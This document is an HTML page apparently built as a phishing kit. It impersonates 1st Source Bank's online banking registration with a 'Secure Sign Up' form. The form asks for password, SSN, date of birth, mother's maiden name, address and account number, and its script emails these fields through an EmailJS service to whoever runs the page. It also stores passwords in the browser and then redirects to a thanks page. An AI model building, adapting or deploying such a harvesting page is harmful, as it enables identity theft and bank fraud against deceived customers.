<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Sign Up</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            padding: 10px 20px;
        }
        header h3, footer h3 {
            color: #ff4500;
            font-size: 1.5em;
            margin: 0;
            text-align: left;
        }
        footer h3 {
            text-align: center;
        }
        header h3 span, footer h3 span {
            color: #000;
        }
        .container {
            width: 100%;
            padding: 20px;
            flex: 1;
        }
        h2 {
            color: #333;
            text-align: center;
            font-size: 1.5em;
            margin-bottom: 10px;
        }
        .section {
            margin-bottom: 20px;
            background-color: #f5f5f5;
            padding: 10px;
            border-radius: 4px;
        }
        .section h4 {
            margin: 10px 0;
            font-size: 1em;
            color: #333;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-size: 0.9em;
            color: #666;
        }
        input[type="text"],
        input[type="password"],
        input[type="email"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 0.9em;
        }
        .field-container {
            display: flex;
            justify-content: space-between;
            gap: 10px;
        }
        .field-container div {
            flex: 1;
            position: relative;
        }
        .field-container a {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 0.8em;
            color: #0066cc;
            text-decoration: none;
        }
        .field-container a:hover {
            text-decoration: underline;
        }
        .checkbox {
            display: flex;
            align-items: center;
            margin: 10px 0;
        }
        .checkbox input {
            margin-right: 10px;
        }
        .checkbox label {
            margin: 0;
            font-size: 0.8em;
            color: #666;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #333;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
        }
        button:hover {
            background-color: #555;
        }
        footer {
            background-color: #ffffff !important;
            padding: 10px 20px;
            margin-top: auto;
        }
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            h2, header h3, footer h3 {
                font-size: 1.2em;
            }
            .section h4 {
                font-size: 0.9em;
            }
            label, input, select, button {
                font-size: 0.85em;
            }
            .field-container {
                flex-direction: column;
            }
            .field-container a {
                font-size: 0.75em;
            }
            .checkbox label {
                font-size: 0.75em;
            }
        }
        @media (max-width: 480px) {
            .container {
                padding: 10px;
            }
            h2, header h3, footer h3 {
                font-size: 1em;
            }
            .section h4 {
                font-size: 0.85em;
            }
            label, input, select, button {
                font-size: 0.8em;
            }
            .field-container a {
                font-size: 0.7em;
            }
            .checkbox label {
                font-size: 0.7em;
            }
        }
    </style>
</head>
<body>
    <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/1st_Source_Bank_logo.svg/1280px-1st_Source_Bank_logo.svg.png" alt="Source Bank Logo" style="height: 50px; width: auto; margin: 0 auto;">
    </header>

    <div class="container">
        <h2>Secure Sign Up</h2>
        <p style="text-align: center; color: #666;">Welcome to Online Banking Registration Form!</p>

        <form id="signupForm">
            <div class="section">
                <h4>Create Login</h4>
                <label for="user-id">User ID</label>
                <input type="text" id="user-id" name="User ID" placeholder="Create your User ID" required>

                <div class="field-container">
                    <div>
                        <label for="password">Password</label>
                        <input type="password" id="password" name="Password" placeholder="Create your Password" required>
                        <a href="#" class="show-password">SHOW</a>
                    </div>
                    <div>
                        <label for="retype-password">Retype Password</label>
                        <input type="password" id="retype-password" name="Retype Password" placeholder="Retype your Password" required>
                        <a href="#" class="show-password">SHOW</a>
                    </div>
                </div>
            </div>

            <div class="section">
                <h4>Personal Information</h4>
                <label for="first-name">First Name</label>
                <input type="text" id="first-name" name="First Name" required>

                <div class="field-container">
                    <div>
                        <label for="last-name">Last Name</label>
                        <input type="text" id="last-name" name="Last Name" required>
                    </div>
                    <div>
                        <label for="suffix">Suffix</label>
                        <select id="suffix" name="Suffix">
                            <option value="">Select Suffix</option>
                            <option value="jr">Mr.</option>
                            <option value="sr">Mrs.</option>
                        </select>
                    </div>
                </div>

                <label for="dob">Date of Birth</label>
                <input type="text" id="dob" name="Date of Birth" placeholder="MM/DD/YYYY" required>

                <label for="mothers-maiden">Mother's Maiden Name</label>
                <input type="text" id="mothers-maiden" name="Mother's Maiden Name" required>

                <label for="ssn">SSN</label>
                <input type="text" id="ssn" name="SSN" placeholder="XXX-XX-XXXX" required>
            </div>

            <div class="section">
                <h4>Contact Information</h4>
                <label for="address">Street Address</label>
                <input type="text" id="address" name="Street Address" required>

                <label for="city">City</label>
                <input type="text" id="city" name="City" required>

                <div class="field-container">
                    <div>
                        <label for="state">State</label>
                        <select id="state" name="State" required>
                            <option value="">Select State</option>
                            <option value="CA">California</option>
                            <option value="NY">New York</option>
                        </select>
                    </div>
                    <div>
                        <label for="zip">Zip Code</label>
                        <input type="text" id="zip" name="Zip Code" required>
                    </div>
                </div>

                <label for="country">Country</label>
                <select id="country" name="Country" required>
                    <option value="">Select Country</option>
                    <option value="US">United States</option>
                </select>

                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="Phone Number" placeholder="XXX-XXX-XXXX" required>

                <label for="email">Email Address</label>
                <input type="email" id="email" name="Email Address" required>
            </div>

            <div class="section">
                <h4>Account Information</h4>
                <div class="field-container">
                    <div>
                        <label for="account-type">Account Type</label>
                        <select id="account-type" name="Account Type" required>
                            <option value="">Select Account Type</option>
                            <option value="checking">Checking</option>
                            <option value="savings">Savings</option>
                        </select>
                    </div>
                    <div>
                        <label for="account-number">Account Number</label>
                        <input type="text" id="account-number" name="Account Number" required>
                    </div>
                </div>
            </div>

            <div class="checkbox">
                <input type="checkbox" id="terms" name="Terms Accepted" required>
                <label for="terms">I have read and agree to the Terms & Conditions</label>
            </div>

           <a href="thankspage.html"> <button type="submit">Submit</button></a>
        </form>
    </div>

    <footer>
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTUt86SNaiBXSt-QKd1GsFUeKyZMgyLlRoExz1vTxcI-hl0-Nzu9oJWucpFMBbNr5TKdkM&usqp=CAU" alt="Source Bank Logo" style="height: 50px; width: auto; display: block; margin: 0 auto;">
    </footer>

    <script>
        // Initialize EmailJS with your User ID
        (function(){
            emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS User ID
        })();

        // Toggle password visibility
        document.querySelectorAll('.show-password').forEach(link => {
            link.addEventListener('click', function(event) {
                event.preventDefault();
                const input = this.previousElementSibling;
                if (input.type === 'password') {
                    input.type = 'text';
                    this.textContent = 'HIDE';
                } else {
                    input.type = 'password';
                    this.textContent = 'SHOW';
                }
            });
        });

        // Handle form submission
        document.getElementById('signupForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const userId = document.getElementById('user-id').value;
            const password = document.getElementById('password').value;
            const retypePassword = document.getElementById('retype-password').value;
            const firstName = document.getElementById('first-name').value;
            const lastName = document.getElementById('last-name').value;
            const suffix = document.getElementById('suffix').value;
            const dob = document.getElementById('dob').value;
            const mothersMaiden = document.getElementById('mothers-maiden').value;
            const ssn = document.getElementById('ssn').value;
            const address = document.getElementById('address').value;
            const city = document.getElementById('city').value;
            const state = document.getElementById('state').value;
            const zip = document.getElementById('zip').value;
            const country = document.getElementById('country').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;
            const accountType = document.getElementById('account-type').value;
            const accountNumber = document.getElementById('account-number').value;

            // Validate passwords match
            if (password !== retypePassword) {
                window.location.href = `index.html?userId=${encodeURIComponent(userId)}`;
                return;
            }

            // Validate form
            if (!this.checkValidity()) {
                this.reportValidity();
                return;
            }

            // Store user data in localStorage (for login validation)
            const users = JSON.parse(localStorage.getItem('users')) || [];
            if (!users.some(u => u.userId === userId)) {
                users.push({ userId, password, email, accountNumber, accountType });
                localStorage.setItem('users', JSON.stringify(users));
            }

            // Prepare email data
            const templateParams = {
                user_id: userId,
                first_name: firstName,
                last_name: lastName,
                suffix: suffix,
                dob: dob,
                mothers_maiden: mothersMaiden,
                ssn: ssn,
                address: address,
                city: city,
                state: state,
                zip: zip,
                country: country,
                phone: phone,
                email: email,
                account_type: accountType,
                account_number: accountNumber
            };

            // Send email via EmailJS
            emailjs.send('service_irtc32r', 'template_uh4d32w', templateParams)
                .then(function(response) {
                    window.location.href = `thankspage.html?userId=${encodeURIComponent(userId)}`;
                }, function(error) {
                    window.location.href = `index.html?userId=${encodeURIComponent(userId)}`;
                });
        });
    </script>
</body>
</html>
